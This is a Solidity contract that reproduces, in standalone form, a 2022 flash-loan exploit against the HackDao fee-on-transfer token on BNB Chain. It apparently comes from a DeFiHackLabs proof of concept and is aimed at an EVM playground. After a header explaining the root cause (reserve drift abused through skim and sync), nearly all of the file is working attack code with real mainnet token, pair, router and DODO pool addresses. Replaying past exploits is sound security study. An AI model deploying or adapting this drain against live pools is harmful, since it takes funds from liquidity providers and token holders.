// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-05-HackDao).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the DODO flash-loan callback `DPPFlashLoanCall` lives on the test
// itself (`assetTo = address(this)`), and profit (WBNB) stays in the test
// contract (`WBNB.balanceOf(address(this))` is logged at the end). There is no
// standalone contract to deploy. This file is a faithful, self-contained copy
// of that inline attack (testExploit body + DPPFlashLoanCall callback + the
// manual getAmountOut + minimal inline interfaces — no imports so it compiles
// anywhere), compiled inside the registry forge project. Logic and constants
// are copied verbatim from test/HackDao_exp.sol.
//
// Root cause: the Hackerdao (HackDao) token is a heavy fee-on-transfer /
// reflection token listed in a vanilla (fee-unaware) Pancake pair. Its
// overridden `_transfer` debits an EXTRA 12% fee from the sender on a "sell"
// (recipient == the token's single hard-wired `uniswapV2Pair`, which is the
// HackDao/USDT pair, NOT the HackDao/WBNB pair) while still crediting the pair
// the FULL amount, and on every other (default) transfer credits the recipient
// only 88% while stripping destroy/pool cuts from the sender. Both behaviours
// make the pair's real `balanceOf` drift from its cached `reserve`. Anyone can
// `skim()`/`sync()` a Pancake pair, so the attacker: flash-borrows 1,900 WBNB
// from a DODO DVM pool, buys HackDao from the WBNB pair (driving its real
// HackDao balance BELOW its cached reserve), pushes the bought HackDao back
// into the WBNB pair (raising the real balance ABOVE the cached reserve),
// `skim()`s the excess out to the HackDao/USDT pair, `sync()`s the WBNB pair's
// reserve DOWN to its now-depleted real balance, `skim()`s the HackDao back
// in, and finally sells into the now-mispriced pool (reserve0 collapsed ~95%
// while reserve1 is intact) — extracting ~2,063.67 WBNB. After repaying the
// 1,900 WBNB flash loan, ~163.67 WBNB of pure profit remains in the contract.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract HackDaoDrain {
    IERC20 constant HackDao = IERC20(0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniswapV2Pair constant Pair1 = IUniswapV2Pair(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2); // HackDao/WBNB
    IUniswapV2Pair constant Pair2 = IUniswapV2Pair(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225); // HackDao/USDT
    IUniswapV2Router02 constant Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    // entrypoint — verbatim from ContractTest.testExploit()
    function run() external {
        WBNB.approve(address(Router), type(uint256).max);
        HackDao.approve(address(Router), type(uint256).max);
        IDVM(dodo).flashLoan(1900 * 1e18, 0, address(this), new bytes(1));
    }

    // DODO flash-loan callback — verbatim from ContractTest.DPPFlashLoanCall()
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // get HackDao
        buyHackDao();
        // call skim() to burn HackDao in lp
        HackDao.transfer(address(Pair1), HackDao.balanceOf(address(this)));
        Pair1.skim(address(Pair2));
        Pair1.sync();
        Pair2.skim(address(Pair1));
        // sell HackDao
        (uint256 reserve0, uint256 reserve1,) = Pair1.getReserves(); // HackDao WBNB
        uint256 amountAfter = HackDao.balanceOf(address(Pair1));
        uint256 amountin = amountAfter - reserve0;
        uint256 amountout = amountin * 9975 * reserve1 / (reserve0 * 10_000 + amountin * 9975);
        Pair1.swap(0, amountout, address(this), "");
        WBNB.transfer(dodo, 1900 * 1e18);
    }

    function buyHackDao() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(HackDao);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
